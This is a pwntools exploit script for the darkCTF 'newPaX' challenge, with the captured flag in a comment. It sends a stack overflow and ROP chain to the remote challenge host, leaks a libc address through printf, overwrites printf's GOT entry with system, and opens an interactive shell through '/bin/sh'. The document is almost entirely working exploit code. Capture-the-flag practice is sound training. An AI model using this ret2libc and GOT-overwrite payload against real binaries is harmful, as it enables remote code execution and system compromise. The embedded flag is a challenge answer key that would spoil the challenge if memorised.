#exploit for newPax
#darkCTF{f1n4lly_y0u_r3s0lv3_7h1s_w17h_dlr3s0lv3}
from pwn import *
import time
elf = ELF("./newPaX")
context.binary=elf
target=remote('newpax.darkarmy.xyz',5001)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

popret=0x080483d1
pop3ret=0x08048729
payload="A"*0x34+p32(elf.plt["printf"])+p32(popret)+p32(elf.got["read"])+p32(elf.plt["read"])+p32(pop3ret)+p32(0)+p32(elf.got["printf"])+p32(0x10)
payload+=p32(elf.plt["printf"])+p32(popret)+p32(elf.got["printf"]+4)
target.send(payload)
libc_base=u32(target.recv(4))-0x0e56c0
libc_system=libc_base+0x03cd80
payload=p32(libc_system)+"/bin/sh\x00"
target.send(payload)
target.interactive()
